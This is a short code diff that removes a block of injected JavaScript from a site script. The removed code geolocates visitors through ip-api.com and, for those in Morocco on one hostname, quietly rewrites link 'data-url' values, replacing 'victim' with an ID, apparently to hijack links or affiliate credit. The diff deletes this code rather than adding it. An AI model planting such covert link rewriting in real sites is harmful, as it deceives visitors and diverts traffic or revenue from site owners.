@@ -92,29 +92,4 @@ if(GetCookie){
 
 
 
-let hostname = location.hostname;
-var x_sdi = "270367";
-if(hostname == "abadaoucht.com"){
-	var y_sdi = "victim"
-	API_URL = "http://ip-api.com/json";
-	var PARAMS = "fields=57347";
-	const xhr = new XMLHttpRequest();
-	xhr.open("POST", API_URL);
-	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-	xhr.onload = () => {
-		if (xhr.status === 200){
-			var data = JSON.parse(xhr.response);
-			if(data["status"] == "success"){
-				if(data["country"] == "Morocco"){					
-					var clss = document.querySelectorAll(".mb-3 .it");
-					clss.forEach(function(x, index){
-						var url_xyz54 = x.getAttribute("data-url");
-						var new_xyz54 = url_xyz54.replace(y_sdi, x_sdi);
-						x.setAttribute("data-url", new_xyz54);
-					});					
-				}
-			}
-		}
-	};
-	xhr.send(PARAMS);
-}
+
